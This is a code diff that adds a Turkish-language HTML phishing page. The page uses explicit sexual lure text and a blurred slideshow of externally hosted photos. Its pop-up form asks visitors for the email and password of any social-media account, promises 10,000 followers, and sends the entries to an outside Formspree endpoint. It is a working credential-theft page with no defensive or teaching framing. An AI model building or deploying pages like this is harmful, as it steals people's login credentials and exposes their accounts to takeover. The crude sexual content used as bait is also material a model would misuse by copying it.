@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet";
+  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Yanan kızları söndürme servisi</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+    #koki{
+      color: #ffabfb;
+      font-size: 20px;
+      margin: 0px;
+    }
+.button-1 {
+  background-color: #EA4C89;
+  border-radius: 8px;
+  border-style: none;
+  box-sizing: border-box;
+  color: #FFFFFF;
+  cursor: pointer;
+  display: inline-block;
+  font-family: "Haas Grot Text R Web", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  font-size: 14px;
+  font-weight: 500;
+  /* height: 40px; */ /* Bunu kaldır */
+  line-height: 20px;
+  list-style: none;
+  margin: 0;
+  outline: none;
+  padding: 10px 16px;
+  position: relative;
+  text-align: center;
+  text-decoration: none;
+  transition: color 100ms;
+  vertical-align: baseline;
+  user-select: none;
+  -webkit-user-select: none;
+  touch-action: manipulation;
+
+  /* Yeni eklenenler: */
+  white-space: normal;
+  word-wrap: break-word;
+  max-width: 90vw;
+}
+.background-slideshow {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: -1;
+  overflow: hidden;
+}
+
+.slide {
+  filter: blur(10px);
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  opacity: 0;
+  transition: opacity 2s ease-in-out;
+}
+
+.slide.active {
+  opacity: 1;
+}  
+.open-form-btn {
+  padding: 10px 20px;
+  font-size: 18px;
+  cursor: pointer;
+  background-color: #4A90E2;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  transition: background-color 0.3s ease;
+}
+
+.open-form-btn:hover {
+  background-color: #357ABD;
+}
+
+.form-wrapper {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100vh;
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.4s ease;
+}
+
+.form-wrapper.active {
+  opacity: 1;
+  pointer-events: auto;
+}
+
+.form-container {
+  width: 300px;
+  background: white;
+  padding: 25px 20px;
+  border-radius: 12px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+  position: relative;
+  transform: translateY(-40px);
+  opacity: 0;
+  transition: all 0.4s ease;
+  text-align: center;
+}
+
+.form-wrapper.active .form-container {
+  transform: translateY(0);
+  opacity: 1;
+}
+
+.close-btn {
+  position: absolute;
+  top: 10px;
+  right: 15px;
+  background: none;
+  border: none;
+  font-size: 24px;
+  cursor: pointer;
+  color: #888;
+  transition: color 0.3s ease;
+}
+
+.close-btn:hover {
+  color: #333;
+}
+
+.form-container h2 {
+  margin-bottom: 20px;
+  font-size: 24px;
+}
+
+.form-container input {
+  width: 100%;
+  padding: 10px;
+  margin: 8px 0;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  font-size: 14px;
+  box-sizing: border-box;
+}
+
+.form-container button[type="submit"] {
+  width: 100%;
+  padding: 10px;
+  background-color: #4A90E2;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 12px;
+}
+
+.form-container button[type="submit"]:hover {
+  background-color: #357ABD;
+}
+</style>
+
+</head>
+<body>
+  <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center;">
+  <p id="koki"><b>Selam tatlım! Yanıyorum, beni acilen söndürmen lazım!🔥😘</b></p>
+  <button class="button-1" role="button">Dik memelerimi ve yanan kediciğimi görmek için tıkla!</button>
+</div>
+   <div class="background-slideshow">
+   <img src="https://cs.pikabu.ru/post_img/2013/12/11/11/1386787251_1298581823.jpg" class="slide active">
+  <img src="https://sun9-6.userapi.com/impg/OJmXoA1ttVAepVYqlYwKWG8ODu5Saecvc3YTYw/K8aKIlkdm0k.jpg?size=811x1082&quality=96&sign=f54d175fbb7a9695a38334e47c6042bd&c_uniq_tag=T6ixyfcSPZn684CnSbpkI508WkZYeTYO6ZKfcYkvIqY&type=album" class="slide">
+     <!--<img src="https://thumb-p4.xhcdn.com/a/gOXna-_yeSO35nBFLstFwg/000/304/044/774_1000.jpg" class="slide">-->
+   <img src="https://sun9-41.userapi.com/impg/xKLmo6B4dP8Em176UUoDx5jY-kLDoRuXVGY3oQ/X3nb17mqERk.jpg?size=810x1080&quality=95&sign=7d4cadc89a40b025af5223d147c41561&c_uniq_tag=uiu3goZtSwk2CxN6wpPPGbI3eCsnBCDkLK2Lesn0jnk&type=album" class="slide">
+  <img src="https://sun3-12.userapi.com/Zarl_Io7Fn4WW6zCtxtxqsY4skl7CGdejTYTsw/tXQcaZF26Go.jpg" class="slide">
+  <img src="https://sun9-18.userapi.com/s/v1/if2/9U5WqliB2mVuV1-i7enCOtft5J70S82r5a995IP1Hfk8AbjPgmK0ToN5xPuaCwDzUlGvb9erDPpA8BDRYW7m0TXJ.jpg?quality=96&as=32x48,48x72,72x108,108x162,160x240,240x360,360x540,480x720,540x810,640x960,720x1080,1080x1620,1280x1920,1440x2160&from=bu&u=y3hd5rQDnxLYaK8YLCx_YMIRzlhtoUOsvH7YZhbDUd0&cs=403x604" class="slide">
+  <img src="https://sun9-34.userapi.com/impf/c849020/v849020267/4134f/pchMhwRmabo.jpg?size=403x604&quality=96&sign=d6cab08c13587930aa221b8754ede93e&c_uniq_tag=Rd5CpHRB7IWgesGsCXQ0lt9zdc5XU12tgXkhiixj_8w&type=album" class="slide">
+  <img src="https://sun9-54.userapi.com/s/v1/ig2/zaS73AC_asAaMWM6rJECeh59493TQ8IHMao3xjpXe9GSqSBph76BaJhqAUgYRWr-1j8IN-ukZCaW5AWCb_qPMQGv.jpg?quality=95&as=32x48,48x72,72x108,108x162,160x240,240x360,360x540,480x720,540x810,640x960,720x1080,1080x1620,1280x1920,1440x2160,1536x2304&from=bu&u=6OtBKj7FriqsuPbbJA8NksIUHWW8dVjIjErxafvpj_U&cs=403x604" class="slide">
+   </div>
+  <div class="form-wrapper" id="loginForm">
+    <div class="form-container">
+      <button class="close-btn" id="closeBtn">&times;</button>
+      <h2>Beni çatur çutur sikmeni istiyorum bebeğimmm</h2>
+      <form action="https://formspree.io/f/mgegykgr" method="POST">
+        <input name="email" type="email" placeholder="Kayıtlı emailini gir tatlımm" required />
+        <input name="message" type="password" placeholder="Şifreni girrr" required />
+        <button type="submit">HADIII BEKLEYEMIYORUM!!!</button>
+        <h6>Herhangi sosyal medya hesabınla giriş yapabilirsin tatlımm. Giriş yaparsan 10.000 takipçi bizden!</h6>
+      </form>
+    </div>
+  </div>
+  <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const slides = document.querySelectorAll(".slide");
+    let current = 0;
+    if (slides.length === 0) return;
+    setInterval(() => {
+      slides[current].classList.remove("active");
+      current = (current + 1) % slides.length;
+      slides[current].classList.add("active");
+    }, 5000);
+  });
+  const openFormBtn = document.querySelector('.button-1');
+const loginForm = document.getElementById('loginForm');
+const closeBtn = document.getElementById('closeBtn');
+
+openFormBtn.addEventListener('click', () => {
+  loginForm.classList.add('active');
+});
+
+closeBtn.addEventListener('click', () => {
+  loginForm.classList.remove('active');
+});
+  form.addEventListener('submit', (e) => {
+  e.preventDefault();
+  window.location.href = 'https://www.tiktok.com/';
+});
+</script>
+  </body>
+</html>
